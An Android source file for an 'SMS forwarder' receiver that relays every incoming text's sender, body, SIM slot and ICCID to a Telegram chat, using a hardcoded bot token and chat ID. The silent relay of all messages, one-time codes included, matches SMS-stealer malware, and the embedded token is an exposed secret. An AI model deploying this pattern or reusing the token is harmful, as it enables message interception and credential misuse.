package com.SMSForwarder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.Set;

public class SmsBroadcastReceiver extends BroadcastReceiver {

    String apiToken = "6183760548:AAGt4b46YH1riIqL__sA_ic6fWMIEOhm0Uw";
    String chatId = "-1001617413132";


    public void onReceive(Context context, Intent intent) {

        try {
            if (intent.getAction().equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
                Bundle bundle = intent.getExtras();

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                    String phoneNumber = currentMessage.getDisplayOriginatingAddress();
                    String message = currentMessage.getDisplayMessageBody();

                    String incomeICCID = "";
                    int Slot = GetSlotIndex(bundle);
                    switch (Slot) {
                        case 0:
                            incomeICCID = MainActivity.Sim1IccId;
                            break;
                        case 1:
                            incomeICCID = MainActivity.Sim2IccId;
                            break;
                        default:
                            break;
                    }

                    // check if message start with "icc:"
//                    if (message.startsWith("icc:")) {
//                        String[] parts = message.split(":");
//                        if (parts.length > 1) {
//                            incomeICCID = parts[1];
//                        }
//                    }

                    new AsyncTGRequest().execute(apiToken, chatId, phoneNumber, incomeICCID, ""+Slot, message);
                }
            }

        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);
        }
    }

    public int GetSlotIndex(Bundle bundle) {
        int slot = -1;
        Set<String> keySet = bundle.keySet();
        for (String key : keySet) {
            if (key.equals("phone")) {
                slot = bundle.getInt("phone", -1);
            }//in api 29
            else if (key.equals("slot")) {
                slot = bundle.getInt("slot", -1);
            } else if (key.equals("slotId")) {
                slot = bundle.getInt("slotId", -1);
            } else if (key.equals("slot_id")) {
                slot = bundle.getInt("slot_id", -1);
            } else if (key.equals("slotIdx")) {
                slot = bundle.getInt("slotIdx", -1);
            } else if (key.equals("simId")) {
                slot = bundle.getInt("simId", -1);
            } else if (key.equals("simSlot")) {
                slot = bundle.getInt("simSlot", -1);
            } else if (key.equals("simnum")) {
                slot = bundle.getInt("simnum", -1);
            }
        }
        return slot;
    }
}